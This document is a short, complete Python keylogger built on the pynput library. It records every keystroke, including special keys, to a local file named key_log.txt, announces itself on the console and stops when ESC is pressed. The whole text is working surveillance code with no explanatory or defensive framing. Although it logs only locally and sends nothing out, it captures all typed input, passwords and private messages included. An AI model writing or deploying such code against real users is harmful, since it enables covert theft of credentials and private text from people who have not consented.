from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # For special keys

    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\nESC pressed. Stopping keylogger...")
        return False  # Stops the listener

def main():
    print("Keylogger started. Press ESC to stop...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
